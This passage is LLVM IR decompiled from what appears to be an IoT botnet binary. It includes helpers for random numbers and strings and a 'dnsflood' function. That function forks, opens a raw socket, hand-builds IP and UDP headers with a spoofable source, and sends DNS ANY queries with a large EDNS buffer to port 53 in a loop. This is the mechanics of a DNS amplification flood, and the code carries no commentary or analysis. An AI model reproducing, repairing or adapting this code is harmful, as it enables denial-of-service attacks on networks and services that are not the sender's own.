  %v2_9e5c = inttoptr i32 %v1_9e5c to i32*
  %v3_9e5c = load i32, i32* %v2_9e5c, align 4
  store i32 %v3_9e5c, i32* @r3, align 4
  store i32 %v3_9e5c, i32* @r2, align 4
  %v3_9e6c = call i32 @bcopy(i32 %v2_9e54, i32 ptrtoint (i32* @global_var_49f4c.136 to i32), i32 %v3_9e5c)
  %v2_9e74.pre = load i32, i32* @global_var_49f4c.136, align 4
  br label %dec_label_pc_9e70

dec_label_pc_9e70:                                ; preds = %entry, %dec_label_pc_9e4c
  %v2_9e74 = phi i32 [ %v1_9dec, %entry ], [ %v2_9e74.pre, %dec_label_pc_9e4c ]
  store i32 %v3_9dd4, i32* @fp, align 4
  ret i32 %v2_9e74

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_49f4c.136, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9e70, { 1, 0 }
  uselistorder label %dec_label_pc_9e4c, { 1, 0 }
}

define i32 @ChangetoDnsNameFormat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %stack_var_-40 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_9e94 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9e94, i32* @ip, align 4
  %v3_9e98 = load i32, i32* @r4, align 4
  store i8* %tmp, i8** %stack_var_-40, align 4
  store i32 %arg2, i32* @r4, align 4
  %v3_9ebc = call i32 @strlen(i8* %tmp)
  %v1_9ec4 = load i32, i32* @r4, align 4
  %v2_9ec4 = add i32 %v1_9ec4, %v3_9ebc
  store i32 %v2_9ec4, i32* @r3, align 4
  store i32 %v2_9ec4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_36fec.141 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  %v0_9ed4 = call i32 @memcpy()
  br label %dec_label_pc_9f8c

dec_label_pc_9ee4:                                ; preds = %dec_label_pc_9f8c
  %v3_9eec = load i8*, i8** %stack_var_-40, align 4
  %v4_9eec = ptrtoint i8* %v3_9eec to i32
  %v2_9ef0 = add i32 %v4_9eec, %indvars.iv14
  %v1_9ef4 = inttoptr i32 %v2_9ef0 to i8*
  %v2_9ef4 = load i8, i8* %v1_9ef4, align 1
  %v7_9ef8 = icmp eq i8 %v2_9ef4, 46
  br i1 %v7_9ef8, label %dec_label_pc_9f00, label %dec_label_pc_9f80

dec_label_pc_9f00:                                ; preds = %dec_label_pc_9ee4
  %fold = sub i32 %indvars.iv14, %stack_var_-32.2
  %v4_9f18 = ptrtoint i8* %stack_var_-36.2 to i32
  %v1_9f1c = trunc i32 %fold to i8
  store i8 %v1_9f1c, i8* %stack_var_-36.2, align 1
  br label %dec_label_pc_9f64

dec_label_pc_9f30:                                ; preds = %dec_label_pc_9f64
  %v3_9f38 = load i8*, i8** %stack_var_-40, align 4
  %v4_9f38 = ptrtoint i8* %v3_9f38 to i32
  %v2_9f3c = add i32 %v4_9f38, %stack_var_-32.0
  %v1_9f40 = inttoptr i32 %v2_9f3c to i8*
  %v2_9f40 = load i8, i8* %v1_9f40, align 1
  store i8 %v2_9f40, i8* %stack_var_-36.0, align 1
  %v1_9f5c = add i32 %stack_var_-32.0, 1
  br label %dec_label_pc_9f64

dec_label_pc_9f64:                                ; preds = %dec_label_pc_9f00, %dec_label_pc_9f30
  %stack_var_-32.0 = phi i32 [ %v1_9f5c, %dec_label_pc_9f30 ], [ %stack_var_-32.2, %dec_label_pc_9f00 ]
  %stack_var_-36.0.in.in = phi i32 [ %stack_var_-36.0.in, %dec_label_pc_9f30 ], [ %v4_9f18, %dec_label_pc_9f00 ]
  %stack_var_-36.0.in = add i32 %stack_var_-36.0.in.in, 1
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  %v5_9f70 = icmp slt i32 %stack_var_-32.0, %indvars.iv14
  br i1 %v5_9f70, label %dec_label_pc_9f30, label %dec_label_pc_9f74

dec_label_pc_9f74:                                ; preds = %dec_label_pc_9f64
  %v1_9f78 = add i32 %stack_var_-32.0, 1
  br label %dec_label_pc_9f80

dec_label_pc_9f80:                                ; preds = %dec_label_pc_9ee4, %dec_label_pc_9f74
  %stack_var_-32.1 = phi i32 [ %v1_9f78, %dec_label_pc_9f74 ], [ %stack_var_-32.2, %dec_label_pc_9ee4 ]
  %stack_var_-36.1 = phi i8* [ %stack_var_-36.0, %dec_label_pc_9f74 ], [ %stack_var_-36.2, %dec_label_pc_9ee4 ]
  %indvars.iv.next15 = add i32 %indvars.iv14, 1
  br label %dec_label_pc_9f8c

dec_label_pc_9f8c:                                ; preds = %entry, %dec_label_pc_9f80
  %indvars.iv14 = phi i32 [ 0, %entry ], [ %indvars.iv.next15, %dec_label_pc_9f80 ]
  %stack_var_-32.2 = phi i32 [ 0, %entry ], [ %stack_var_-32.1, %dec_label_pc_9f80 ]
  %stack_var_-36.2 = phi i8* [ %arg1, %entry ], [ %stack_var_-36.1, %dec_label_pc_9f80 ]
  %v3_9f90 = load i8*, i8** %stack_var_-40, align 4
  %v3_9f98 = call i32 @strlen(i8* %v3_9f90)
  %v3_9fa0 = icmp ult i32 %indvars.iv14, %v3_9f98
  br i1 %v3_9fa0, label %dec_label_pc_9ee4, label %dec_label_pc_9fa8

dec_label_pc_9fa8:                                ; preds = %dec_label_pc_9f8c
  store i8 0, i8* %stack_var_-36.2, align 1
  store i32 %v3_9e98, i32* @r4, align 4
  ret i32 %v3_9f98

; uselistorder directives
  uselistorder i8* %stack_var_-36.2, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-32.2, { 2, 0, 1 }
  uselistorder i32 %indvars.iv14, { 0, 3, 2, 1, 4 }
  uselistorder i32 %stack_var_-32.0, { 0, 3, 1, 2 }
  uselistorder i8** %stack_var_-40, { 3, 2, 1, 0 }
  uselistorder i8* %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_9f8c, { 1, 0 }
  uselistorder label %dec_label_pc_9f80, { 1, 0 }
  uselistorder label %dec_label_pc_9f64, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_9fe0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_9fe0, i32* @global_var_49f5c.143, align 4
  %v1_a000 = add i32 %v0_9fe0, -1640531527
  store i32 %v1_a000, i32* @global_var_49f60.144, align 4
  %v1_a01c = add i32 %v0_9fe0, 1013904242
  store i32 %v1_a01c, i32* @global_var_49f64.145, align 4
  br label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %entry, %dec_label_pc_a034
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_a078, %dec_label_pc_a034 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_a044 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_49f5c.143 to i32), i32 -12)
  %v6_a044 = inttoptr i32 %v5_a044 to i32*
  %v7_a044 = load i32, i32* %v6_a044, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_a054 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_49f5c.143 to i32), i32 -8)
  %v6_a054 = inttoptr i32 %v5_a054 to i32*
  %v7_a054 = load i32, i32* %v6_a054, align 4
  %v2_a058 = xor i32 %storemerge12, -1640531527
  %v2_a060 = xor i32 %v2_a058, %v7_a044
  %v2_a068 = xor i32 %v2_a060, %v7_a054
  %v5_a070 = mul nuw nsw i32 %storemerge12, 4
  %v6_a070 = add i32 %v5_a070, ptrtoint (i32* @global_var_49f5c.143 to i32)
  %v7_a070 = inttoptr i32 %v6_a070 to i32*
  store i32 %v2_a068, i32* %v7_a070, align 4
  %v1_a078 = add nuw nsw i32 %storemerge12, 1
  %v7_a090 = icmp slt i32 %v1_a078, 4096
  br i1 %v7_a090, label %dec_label_pc_a034, label %dec_label_pc_a094

dec_label_pc_a094:                                ; preds = %dec_label_pc_a034
  %v1_a09c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_a09c

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a034, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_a0d8 = load i32, i32* @global_var_45358.148, align 4
  %v1_a0dc = add i32 %v2_a0d8, 1
  %v3_a0e4 = urem i32 %v1_a0dc, 4096
  store i32 %v3_a0e4, i32* @global_var_45358.148, align 4
  %v4_a0fc = mul nuw nsw i32 %v3_a0e4, 4
  %v5_a0fc = add i32 %v4_a0fc, ptrtoint (i32* @global_var_49f5c.143 to i32)
  %v6_a0fc = inttoptr i32 %v5_a0fc to i32*
  %v7_a0fc = load i32, i32* %v6_a0fc, align 4
  %v6_a11c = udiv i32 %v7_a0fc, 228675
  store i32 %v6_a11c, i32* @global_var_45354.151, align 4
  br i1 true, label %dec_label_pc_a1ac, label %dec_label_pc_a18c

dec_label_pc_a18c:                                ; preds = %entry
  br label %dec_label_pc_a1ac

dec_label_pc_a1ac:                                ; preds = %entry, %dec_label_pc_a18c
  %v4_a1cc = mul nuw nsw i32 %v3_a0e4, 4
  %v5_a1cc = add i32 %v4_a1cc, ptrtoint (i32* @global_var_49f5c.143 to i32)
  %v6_a1cc = inttoptr i32 %v5_a1cc to i32*
  %v7_a1cc = load i32, i32* %v6_a1cc, align 4
  ret i32 %v7_a1cc

; uselistorder directives
  uselistorder i32 %v3_a0e4, { 0, 2, 1 }
  uselistorder i32* @global_var_49f5c.143, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_49f5c.143 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_a1ac, { 1, 0 }
}

define i32 @myStrCat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp15 = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i8*, align 4
  store i8* %tmp, i8** %stack_var_-24, align 4
  %v2_a2189 = load i8, i8* %arg1, align 1
  %v2_a21c11 = icmp eq i8 %v2_a2189, 0
  br i1 %v2_a21c11, label %dec_label_pc_a250.preheader, label %dec_label_pc_a208

dec_label_pc_a208:                                ; preds = %entry, %dec_label_pc_a208
  %v4_a21412 = phi i32 [ %v1_a20c, %dec_label_pc_a208 ], [ %tmp15, %entry ]
  %v1_a20c = add i32 %v4_a21412, 1
  %v5_a210 = inttoptr i32 %v1_a20c to i8*
  %v2_a218 = load i8, i8* %v5_a210, align 1
  %v2_a21c = icmp eq i8 %v2_a218, 0
  br i1 %v2_a21c, label %dec_label_pc_a250.preheader, label %dec_label_pc_a208

dec_label_pc_a250.preheader:                      ; preds = %dec_label_pc_a208, %entry
  %stack_var_-20.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_a210, %dec_label_pc_a208 ]
  %v2_a2544 = load i8, i8* %tmp, align 1
  %v2_a2586 = icmp eq i8 %v2_a2544, 0
  br i1 %v2_a2586, label %dec_label_pc_a260, label %dec_label_pc_a228

dec_label_pc_a228:                                ; preds = %dec_label_pc_a250.preheader, %dec_label_pc_a228
  %v3_a228 = phi i8* [ %v5_a24c, %dec_label_pc_a228 ], [ %tmp, %dec_label_pc_a250.preheader ]
  %stack_var_-20.17 = phi i8* [ %v5_a240, %dec_label_pc_a228 ], [ %stack_var_-20.0.lcssa, %dec_label_pc_a250.preheader ]
  %v2_a22c = load i8, i8* %v3_a228, align 1
  %v4_a230 = ptrtoint i8* %stack_var_-20.17 to i32
  store i8 %v2_a22c, i8* %stack_var_-20.17, align 1
  %v1_a23c = add i32 %v4_a230, 1
  %v5_a240 = inttoptr i32 %v1_a23c to i8*
  %v3_a244 = load i8*, i8** %stack_var_-24, align 4
  %v4_a244 = ptrtoint i8* %v3_a244 to i32
  %v1_a248 = add i32 %v4_a244, 1
  %v5_a24c = inttoptr i32 %v1_a248 to i8*
  store i8* %v5_a24c, i8** %stack_var_-24, align 4
  %v2_a254 = load i8, i8* %v5_a24c, align 1
  %v2_a258 = icmp eq i8 %v2_a254, 0
  br i1 %v2_a258, label %dec_label_pc_a260, label %dec_label_pc_a228

dec_label_pc_a260:                                ; preds = %dec_label_pc_a228, %dec_label_pc_a250.preheader
  %stack_var_-20.1.lcssa = phi i8* [ %stack_var_-20.0.lcssa, %dec_label_pc_a250.preheader ], [ %v5_a240, %dec_label_pc_a228 ]
  %v4_a260 = ptrtoint i8* %stack_var_-20.1.lcssa to i32
  store i8 0, i8* %stack_var_-20.1.lcssa, align 1
  ret i32 %v4_a260

; uselistorder directives
  uselistorder i8* %v5_a24c, { 1, 2, 0 }
  uselistorder i8* %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_a20c, { 1, 0 }
  uselistorder i8** %stack_var_-24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a228, { 1, 0 }
  uselistorder label %dec_label_pc_a208, { 1, 0 }
}

define i32 @replStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  store i32 41612, i32* %stack_var_-4, align 4
  %v2_a288 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a288, i32* @fp, align 4
  %v2_a29c = icmp eq i32 %arg2, 0
  br i1 %v2_a29c, label %dec_label_pc_a2a4, label %dec_label_pc_a2b0

dec_label_pc_a2a4:                                ; preds = %entry
  br label %dec_label_pc_a348

dec_label_pc_a2b0:                                ; preds = %entry
  %v3_a2b4 = call i32 @strlen(i8* %arg1)
  %v1_a2bc = add i32 %v3_a2b4, 1
  %v2_a2c4 = mul i32 %v1_a2bc, %arg2
  %v1_a2cc = call i32 @malloc(i32 %v2_a2c4)
  %v2_a2dc = icmp eq i32 %v1_a2cc, 0
  br i1 %v2_a2dc, label %dec_label_pc_a2e4, label %dec_label_pc_a2f0

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a2b0
  br label %dec_label_pc_a348

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2b0
  %v4_a2f0 = inttoptr i32 %v1_a2cc to i8*
  store i8 0, i8* %v4_a2f0, align 1
  %v9_a304 = call i32 @myStrCat(i8* %v4_a2f0, i32 %tmp, i32 %v1_a2cc, i32 0, i32 %v1_a2cc)
  %v1_a32c4 = add i32 %arg2, -1
  %v2_a3386 = icmp eq i32 %v1_a32c4, 0
  br i1 %v2_a3386, label %dec_label_pc_a340, label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a2f0, %dec_label_pc_a314
  %v1_a32c8 = phi i32 [ %v1_a32c, %dec_label_pc_a314 ], [ %v1_a32c4, %dec_label_pc_a2f0 ]
  %storemerge37 = phi i32 [ %v8_a31c, %dec_label_pc_a314 ], [ %v9_a304, %dec_label_pc_a2f0 ]
  %v7_a31c = inttoptr i32 %storemerge37 to i8*
  %v8_a31c = call i32 @myStrCat(i8* %v7_a31c, i32 %tmp, i32 %v1_a2cc, i32 %v1_a32c8, i32 ptrtoint (i32* @0 to i32))
  %v1_a32c = add i32 %v1_a32c8, -1
  %v2_a338 = icmp eq i32 %v1_a32c, 0
  br i1 %v2_a338, label %dec_label_pc_a340, label %dec_label_pc_a314

dec_label_pc_a340:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a2f0
  br label %dec_label_pc_a348

dec_label_pc_a348:                                ; preds = %dec_label_pc_a2e4, %dec_label_pc_a2a4, %dec_label_pc_a340
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_a2a4 ], [ 0, %dec_label_pc_a2e4 ], [ %v1_a2cc, %dec_label_pc_a340 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i32 %v1_a32c, { 1, 0 }
  uselistorder i32 %v1_a2cc, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a348, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a314, { 1, 0 }
}

define i32 @setup_udp_header(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @dnsflood(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4692 = alloca i32, align 4
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a380 = load i32, i32* @fp, align 4
  store i32 %v3_a380, i32* %stack_var_-16, align 4
  store i32 41864, i32* %stack_var_-4, align 4
  %v2_a384 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a384, i32* @fp, align 4
  %v0_a3a0 = call i32 @listFork()
  %v2_a3a8 = icmp eq i32 %v0_a3a0, 0
  br i1 %v2_a3a8, label %dec_label_pc_a3b0, label %dec_label_pc_ada0

dec_label_pc_a3b0:                                ; preds = %entry
  %v3_a3e4 = add i32 %arg1, 12
  %v4_a3e4 = inttoptr i32 %v3_a3e4 to i32*
  %v5_a3e4 = load i32, i32* %v4_a3e4, align 4
  %v1_a3f0 = add i32 %arg1, 4
  %v2_a3f0 = inttoptr i32 %v1_a3f0 to i32*
  %v3_a3f0 = load i32, i32* %v2_a3f0, align 4
  %v1_a3fc = add i32 %arg1, 24
  %v2_a3fc = inttoptr i32 %v1_a3fc to i32*
  %v3_a3fc = load i32, i32* %v2_a3fc, align 4
  %v3_a410 = call i32 @socket(i32 2, i32 3, i32 255)
  %v1_a420 = icmp slt i32 %v3_a410, 0
  br i1 %v1_a420, label %dec_label_pc_a428, label %dec_label_pc_a430

dec_label_pc_a428:                                ; preds = %dec_label_pc_a3b0
  %v1_a42c = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_a430

dec_label_pc_a430:                                ; preds = %dec_label_pc_a3b0, %dec_label_pc_a428
  %v2_a434 = call i32 @__GI_time(i32* null)
  %v1_a440 = call i32 @init_rand(i32 %v2_a434)
  %v2_a44c = ptrtoint i32* %stack_var_-4164 to i32
  store i32 %v2_a44c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v0_a45c = call i32 @__GI_memset()
  %v3_a4a0 = bitcast i32* %stack_var_-4164 to i8*
  store i8 69, i8* %v3_a4a0, align 4
  %v3_a4e0 = or i32 %v2_a44c, 1
  %v4_a4e0 = inttoptr i32 %v3_a4e0 to i8*
  store i8 0, i8* %v4_a4e0, align 1
  %v3_a4ec = or i32 %v2_a44c, 2
  %v4_a4ec = inttoptr i32 %v3_a4ec to i16*
  store i16 58, i16* %v4_a4ec, align 2
  %v1_a4f8 = call i32 @__GI_htonl(i32 54321)
  %v1_a50c = trunc i32 %v1_a4f8 to i16
  %v3_a50c = add i32 %v2_a44c, 4
  %v4_a50c = inttoptr i32 %v3_a50c to i16*
  store i16 %v1_a50c, i16* %v4_a50c, align 4
  %v3_a518 = add i32 %v2_a44c, 6
  %v4_a518 = inttoptr i32 %v3_a518 to i16*
  store i16 0, i16* %v4_a518, align 2
  %v3_a524 = add i32 %v2_a44c, 8
  %v4_a524 = inttoptr i32 %v3_a524 to i8*
  store i8 -1, i8* %v4_a524, align 4
  %v3_a530 = add i32 %v2_a44c, 9
  %v4_a530 = inttoptr i32 %v3_a530 to i8*
  store i8 17, i8* %v4_a530, align 1
  %v3_a53c = add i32 %v2_a44c, 10
  %v4_a53c = inttoptr i32 %v3_a53c to i16*
  store i16 0, i16* %v4_a53c, align 2
  store i32 ptrtoint ([14 x i8]* @global_var_36ff0.153 to i32), i32* @r0, align 4
  %v2_a544 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_36ff0.153 to i32))
  %v2_a550 = add i32 %v2_a44c, 12
  %v3_a550 = inttoptr i32 %v2_a550 to i32*
  store i32 %v2_a544, i32* %v3_a550, align 4
  %v2_a574 = add i32 %v2_a44c, 20
  %v5_a578 = inttoptr i32 %v2_a574 to i16*
  %v3_a584 = urem i32 %v3_a3fc, 65536
  %v1_a58c = call i32 @__GI_htons(i32 %v3_a584)
  %sext = mul i32 %v1_a58c, 65536
  %v1_a590 = sdiv i32 %sext, 65536
  %v1_a59c = trunc i32 %v1_a590 to i16
  store i16 %v1_a59c, i16* %v5_a578, align 4
  %v1_a5a4 = call i32 @__GI_htons(i32 53)
  %v1_a5b4 = trunc i32 %v1_a5a4 to i16
  %v3_a5b4 = add i32 %v2_a44c, 22
  %v4_a5b4 = inttoptr i32 %v3_a5b4 to i16*
  store i16 %v1_a5b4, i16* %v4_a5b4, align 2
  %v3_a5c0 = add i32 %v2_a44c, 26
  %v4_a5c0 = inttoptr i32 %v3_a5c0 to i16*
  store i16 0, i16* %v4_a5c0, align 2
  %v2_a5e4 = add i32 %v2_a44c, 28
  %v5_a5e8 = inttoptr i32 %v2_a5e4 to i16*
  %v0_a5ec = call i32 @rand_cmwc()
  %v3_a5f8 = urem i32 %v0_a5ec, 65536
  %v1_a600 = call i32 @__GI_htons(i32 %v3_a5f8)
  %v1_a610 = trunc i32 %v1_a600 to i16
  store i16 %v1_a610, i16* %v5_a5e8, align 4
  %v1_a618 = add i32 %v2_a44c, 30
  %v2_a618 = inttoptr i32 %v1_a618 to i8*
  store i8 1, i8* %v2_a618, align 2
  %v1_a70c = add i32 %v2_a44c, 31
  %v2_a70c = inttoptr i32 %v1_a70c to i8*
  store i8 0, i8* %v2_a70c, align 1
  %v1_a7fc = call i32 @__GI_htons(i32 1)
  %v1_a80c = trunc i32 %v1_a7fc to i16
  %v3_a80c = add i32 %v2_a44c, 32
  %v4_a80c = inttoptr i32 %v3_a80c to i16*
  store i16 %v1_a80c, i16* %v4_a80c, align 4
  %v3_a818 = add i32 %v2_a44c, 34
  %v4_a818 = inttoptr i32 %v3_a818 to i16*
  store i16 0, i16* %v4_a818, align 2
  %v3_a824 = add i32 %v2_a44c, 36
  %v4_a824 = inttoptr i32 %v3_a824 to i16*
  store i16 0, i16* %v4_a824, align 4
  %v1_a82c = call i32 @__GI_htons(i32 1)
  %v1_a83c = trunc i32 %v1_a82c to i16
  %v3_a83c = add i32 %v2_a44c, 38
  %v4_a83c = inttoptr i32 %v3_a83c to i16*
  store i16 %v1_a83c, i16* %v4_a83c, align 2
  store i32 %v5_a3e4, i32* %v3_a550, align 4
  %v1_a898 = add i32 %v3_a3f0, 4
  %v2_a898 = inttoptr i32 %v1_a898 to i32*
  %v3_a898 = load i32, i32* %v2_a898, align 4
  %v2_a8a0 = add i32 %v2_a44c, 16
  %v3_a8a0 = inttoptr i32 %v2_a8a0 to i32*
  store i32 %v3_a898, i32* %v3_a8a0, align 4
  %v3_a8b4 = load i16, i16* %v4_a4ec, align 2
  %div = udiv i16 %v3_a8b4, 2
  %v3_a8b8 = zext i16 %div to i32
  %v2_a8cc = bitcast i32* %stack_var_-4164 to i16*
  %v3_a8cc = call i32 @csum(i16* %v2_a8cc, i32 %v3_a8b8)
  %sext11 = mul i32 %v3_a8cc, 65536
  %v1_a8d0 = sdiv i32 %sext11, 65536
  %v1_a8dc = trunc i32 %v1_a8d0 to i16
  store i16 %v1_a8dc, i16* %v4_a53c, align 2
  %v2_a970 = add i32 %v2_a44c, 40
  %v2_a988 = ptrtoint i32* %stack_var_-4692 to i32
  %v2_a994 = bitcast i32* %stack_var_-4692 to i8*
  %v2_a9ac = inttoptr i32 %v2_a970 to i8*
  %v3_ac9c = add i32 %v2_a44c, 24
  %v4_ac9c = inttoptr i32 %v3_ac9c to i16*
  %v2_aa38 = add i32 %v2_a44c, 45
  %v1_aa64 = add i32 %v2_a44c, 46
  %v1_aa90 = add i32 %v2_a44c, 47
  %v1_aabc = add i32 %v2_a44c, 48
  %v1_aae8 = add i32 %v2_a44c, 49
  %v1_ab14 = add i32 %v2_a44c, 50
  %v1_ab40 = add i32 %v2_a44c, 51
  %v1_ab6c = add i32 %v2_a44c, 52
  %v1_ab98 = add i32 %v2_a44c, 53
  %v1_abc4 = add i32 %v2_a44c, 54
  %v1_abf0 = add i32 %v2_a44c, 55
  br label %dec_label_pc_a8f0

dec_label_pc_a8f0:                                ; preds = %dec_label_pc_ad90, %dec_label_pc_a430
  %stack_var_-60.0 = phi i32 [ %v3_a3f0, %dec_label_pc_a430 ], [ %v3_a910, %dec_label_pc_ad90 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_a430 ], [ %v1_ad94, %dec_label_pc_ad90 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_a430 ], [ %v1_ac40, %dec_label_pc_ad90 ]
  %v7_a8f4 = icmp eq i32 %stack_var_-32.0, 2
  br i1 %v7_a8f4, label %dec_label_pc_a8fc, label %dec_label_pc_a90c

dec_label_pc_a8fc:                                ; preds = %dec_label_pc_a8f0
  %v1_a900 = call i32 @usleep(i32 100)
  br label %dec_label_pc_a90c

dec_label_pc_a90c:                                ; preds = %dec_label_pc_a8f0, %dec_label_pc_a8fc
  %stack_var_-32.1 = phi i32 [ 0, %dec_label_pc_a8fc ], [ %stack_var_-32.0, %dec_label_pc_a8f0 ]
  %v1_a910 = add i32 %stack_var_-60.0, 532
  %v2_a910 = inttoptr i32 %v1_a910 to i32*
  %v3_a910 = load i32, i32* %v2_a910, align 4
  %v2_a934 = add i32 %v2_a970, %stack_var_-28.0
  %v1_a93c = add i32 %stack_var_-28.0, 256
  store i32 %v1_a93c, i32* @r2, align 4
  store i32 %v2_a934, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_a948 = call i32 @__GI_memset()
  %v1_a97c = add i32 %v3_a910, 16
  store i32 %v1_a97c, i32* @r1, align 4
  %v3_a994 = call i32 @strcpy(i8* %v2_a994, i32 %v1_a97c)
  %v3_a9ac = call i32 @ChangetoDnsNameFormat(i8* %v2_a9ac, i32 %v2_a988)
  %v3_a9b8 = call i32 @strlen(i8* %v2_a9ac)
  %v2_a9d8 = add i32 %v3_a9b8, 41
  %v2_a9ec = add i32 %v2_a9d8, %v2_a44c
  %v5_a9f0 = inttoptr i32 %v2_a9ec to i16*
  %v1_a9f8 = call i32 @__GI_htons(i32 255)
  %sext12 = mul i32 %v1_a9f8, 65536
  %v1_a9fc = sdiv i32 %sext12, 65536
  %v1_aa08 = trunc i32 %v1_a9fc to i16
  store i16 %v1_aa08, i16* %v5_a9f0, align 2
  %v1_aa10 = call i32 @__GI_htons(i32 1)
  %v1_aa20 = trunc i32 %v1_aa10 to i16
  %v3_aa20 = add i32 %v2_a9ec, 2
  %v4_aa20 = inttoptr i32 %v3_aa20 to i16*
  store i16 %v1_aa20, i16* %v4_aa20, align 2
  %v2_aa4c = add i32 %v2_aa38, %v3_a9b8
  %v3_aa54 = inttoptr i32 %v2_aa4c to i8*
  store i8 0, i8* %v3_aa54, align 1
  %v2_aa78 = add i32 %v1_aa64, %v3_a9b8
  %v3_aa80 = inttoptr i32 %v2_aa78 to i8*
  store i8 0, i8* %v3_aa80, align 1
  %v2_aaa4 = add i32 %v1_aa90, %v3_a9b8
  %v3_aaac = inttoptr i32 %v2_aaa4 to i8*
  store i8 41, i8* %v3_aaac, align 1
  %v2_aad0 = add i32 %v1_aabc, %v3_a9b8
  %v3_aad8 = inttoptr i32 %v2_aad0 to i8*
  store i8 35, i8* %v3_aad8, align 1
  %v2_aafc = add i32 %v1_aae8, %v3_a9b8
  %v3_ab04 = inttoptr i32 %v2_aafc to i8*
  store i8 40, i8* %v3_ab04, align 1
  %v2_ab28 = add i32 %v1_ab14, %v3_a9b8
  %v3_ab30 = inttoptr i32 %v2_ab28 to i8*
  store i8 0, i8* %v3_ab30, align 1
  %v2_ab54 = add i32 %v1_ab40, %v3_a9b8
  %v3_ab5c = inttoptr i32 %v2_ab54 to i8*
  store i8 0, i8* %v3_ab5c, align 1
  %v2_ab80 = add i32 %v1_ab6c, %v3_a9b8
  %v3_ab88 = inttoptr i32 %v2_ab80 to i8*
  store i8 0, i8* %v3_ab88, align 1
  %v2_abac = add i32 %v1_ab98, %v3_a9b8
  %v3_abb4 = inttoptr i32 %v2_abac to i8*
  store i8 0, i8* %v3_abb4, align 1
  %v2_abd8 = add i32 %v1_abc4, %v3_a9b8
  %v3_abe0 = inttoptr i32 %v2_abd8 to i8*
  store i8 0, i8* %v3_abe0, align 1
  %v2_ac04 = add i32 %v1_abf0, %v3_a9b8
  %v3_ac0c = inttoptr i32 %v2_ac04 to i8*
  store i8 0, i8* %v3_ac0c, align 1
  %v1_ac1c = add i32 %v3_a9b8, 56
  %v2_ac30 = add i32 %v1_ac1c, %v2_a44c
  %v3_ac38 = inttoptr i32 %v2_ac30 to i8*
  store i8 0, i8* %v3_ac38, align 1
  %v1_ac4c = add i32 %v3_a910, 4
  %v2_ac4c = inttoptr i32 %v1_ac4c to i32*
  %v3_ac4c = load i32, i32* %v2_ac4c, align 4
  store i32 %v3_ac4c, i32* %v3_a8a0, align 4
  %fold14 = add i32 %v3_a9b8, 36
  %v3_ac84 = urem i32 %fold14, 65536
  %v1_ac8c = call i32 @__GI_htons(i32 %v3_ac84)
  %v1_ac9c = trunc i32 %v1_ac8c to i16
  store i16 %v1_ac9c, i16* %v4_ac9c, align 4
  %v1_acc8 = trunc i32 %v1_ac1c to i16
  store i16 %v1_acc8, i16* %v4_a4ec, align 2
  %v0_accc = call i32 @rand_cmwc()
  %v3_acd8 = urem i32 %v0_accc, 65536
  %v1_ace0 = call i32 @__GI_htons(i32 %v3_acd8)
